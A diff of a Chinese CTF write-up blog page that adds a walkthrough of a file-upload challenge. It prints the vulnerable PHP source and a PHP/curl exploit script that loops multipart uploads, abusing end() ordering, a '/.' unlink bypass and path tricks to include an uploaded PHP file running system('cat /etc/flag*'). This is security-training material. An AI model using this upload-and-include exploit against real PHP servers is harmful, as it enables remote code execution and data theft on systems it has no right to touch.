@@ -29,7 +29,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/14/E5TcBhdJAjbOxSC.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/14/au1Z3Hjs5QWDB49.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/14/ihkPgYH8LGImbta.png">
-<meta property="og:updated_time" content="2019-09-14T06:33:04.519Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/17/r3WMNq5aETBZVGA.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/17/hQp3jyvUwcYfaDM.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/17/lecGb21QdS6EFPf.png">
+<meta property="og:updated_time" content="2019-09-17T23:53:59.341Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf-wp">
 <meta name="twitter:description" content="记录几题buuctf的web，下午就省赛了，好紧张😳">
@@ -178,12 +181,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <meta name="referrer" content="no-referrer">
-
-
-<blockquote>
+        <blockquote>
 <p>记录几题buuctf的web，下午就省赛了，好紧张😳</p>
 </blockquote>
+<meta name="referrer" content="no-referrer">
+
 <a id="more"></a>
 
 <h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>注册登录，admin无法注册。</p>
@@ -324,6 +326,28 @@
 <blockquote>
 <p>这wp写的不好，有点乱，可能还有些错误的地方。。主要是我tcl，题目一难就容易裂开，改天再整理修改下</p>
 </blockquote>
+<p>======================================================================</p>
+<p>然后今天看到有个大佬说做出来了，偷偷问了一下😀，他是在.7的地方，好吧。。。。我当时只扫到.4，以后还是要耐心一点。。</p>
+<p>重新做一遍，果然在.7的地方找到了上传点</p>
+<p>172.64.136.7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandbox = &apos;/var/sandbox/&apos; . md5(&quot;prefix&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123;</span><br><span class="line">    $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    if (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(&apos;.&apos;, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    if($ext==$filename[count($filename) - 1])&#123;</span><br><span class="line">        die(&quot;try again!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(100,999).&quot;.&quot;.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);</span><br><span class="line">    $_ = $_POST[&apos;hello&apos;];</span><br><span class="line">    if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos;)&#123;</span><br><span class="line">        if(strpos($_,$new_name)===false) &#123;</span><br><span class="line">            include($_);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;you can do it!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有3个trick</p>
+<p>end()，取输入顺序的最后一个</p>
+<p>unlink()，加/. unlink无法删除是linux下的特性</p>
+<p>利用../绕过随机数路径</p>
+<p>先本地测试，用的是上海大学生竞赛web3的代码，和这题类似，修改下沙箱路径</p>
+<p>先自己加个文件上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form  method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/17/r3WMNq5aETBZVGA.png" alt="Snipaste_2019-09-17_22-32-16.png"></p>
+<p>注意只有最后一个参数后面带–，前面的file[0]等不能带–</p>
+<p><img src="https://i.loli.net/2019/09/17/hQp3jyvUwcYfaDM.png" alt="Snipaste_2019-09-17_22-32-25.png"></p>
+<p>大师傅的payload，php脚本+用curl发包。我还是第一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload=&quot;curl -i -s -k  -X &apos;POST&apos;  -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;Origin: null&apos; -H &apos;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymZPeYQvY7ydrgDSx&apos; -H &apos;User-Agent: Mo&apos;  --data-binary $&apos;------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;file[0]\&quot;\x0d\x0a\x0d\x0a0\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;file[2]\&quot;\x0d\x0a\x0d\x0aphp\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;hello\&quot;\x0d\x0a\x0d\x0a/var/sandbox/8aeb002ffc225d1787a0bcc40907ad8a/500.php\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;l3yxxxxxxxxx.php\&quot;\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a@&lt;?php echo 6666;?&gt;\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx--\x0d\x0a&apos;      &apos;http://172.64.136.7/index.php&apos;&quot;;</span><br><span class="line">	for($i=100;$i&lt;200;$i++)&#123;</span><br><span class="line">		system($payload);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for($i=100;$i&lt;200;$i++)&#123;</span><br><span class="line">		$j=(string)$i;</span><br><span class="line">		system(&quot;curl -i -s -k  -X &apos;POST&apos;  -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;Origin: null&apos; -H &apos;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymZPeYQvY7ydrgDSx&apos; -H &apos;User-Agent: Mo&apos;  --data-binary $&apos;------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;file[0]\&quot;\x0d\x0a\x0d\x0a0\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;file[2]\&quot;\x0d\x0a\x0d\x0aphp/.\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;hello\&quot;\x0d\x0a\x0d\x0a/var/sandbox/8aeb002ffc225d1787a0bcc40907ad8a/$j.php\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx\x0d\x0aContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;l3yxxxxxxxxx.php\&quot;\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a@&lt;?php echo 1234569;system(\&quot;cat /etc/flag*\&quot;);?&gt;\x0d\x0a------WebKitFormBoundarymZPeYQvY7ydrgDSx--\x0d\x0a&apos;      &apos;http://172.64.136.7/index.php?0=$_GET[0]&apos;&quot;);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://i.loli.net/2019/09/17/lecGb21QdS6EFPf.png" alt="Snipaste_2019-09-17_21-18-24.png"></p>
 <h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100741998?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100741998?tdsourcetag=s_pctim_aiomsg</a></p>
 <p><a href="http://baijiahao.baidu.com/s?id=1643526533562068493&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1643526533562068493&amp;wfr=spider&amp;for=pc</a></p>
 <p><a href="https://blog.csdn.net/qq_27446553/article/details/81362341" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/81362341</a></p>
@@ -331,6 +355,8 @@
 <p>[<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202/writeup]" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202/writeup]</a>(<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload</a> Labs 2/writeup)</p>
 <p><a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148</a></p>
 <p><a href="https://xz.aliyun.com/t/6050#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/6050#toc-13</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1360551" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1360551</a></p>
+<p><a href="https://sec.wulasite.top/2019/08/09/De1ctf-2019-writeup/" target="_blank" rel="noopener">https://sec.wulasite.top/2019/08/09/De1ctf-2019-writeup/</a></p>
 
       
 
@@ -598,15 +624,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -650,15 +676,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
               </li>
              
               <li class="article-tag-list-item">
